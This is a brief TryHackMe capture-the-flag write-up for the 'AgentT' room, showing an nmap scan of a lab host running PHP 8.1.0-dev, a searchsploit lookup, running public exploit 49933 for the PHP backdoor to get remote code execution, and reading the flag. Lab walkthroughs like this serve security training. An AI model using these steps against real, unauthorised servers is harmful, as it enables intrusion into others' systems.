---
title: "THM: AgentT"
date: 2025-12-20 18:30:00 +1000
categories: [TryHackMe, Easy]
tags: [PHP, Backdoor, RCE]
---

![Banner](/assets/Images/AgentT/banner.png)

---

**Description:**
This lab showcases a PHP backdoor which allows RCE.

## Phase 1: Recon
```bash
❯ sudo nmap -T4 -A -p80 10.48.160.174                               
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard
OS details: Linux 4.15 - 5.19
```

PHP 8.1.0-dev is interesting. Lets see if it has any exploits.
```bash
searchsploit 8.1.0-dev
```
![Exploit](/assets/Images/AgentT/py.png)

---

## Phase 2: Exploit

Pull the exploit into your working directory then execute:
```bash
searchsploit -m 49933
python3 49933.py
```

---

## Phase 3: Post-Exploitation

Cat flag:
```bash
cat /flag.txt
```

---

Thats all folks!

---

**Room:** AgentT | **Platform:** TryHackMe | **Difficulty:** Easy | **Flag Method:** PHP Backdoor
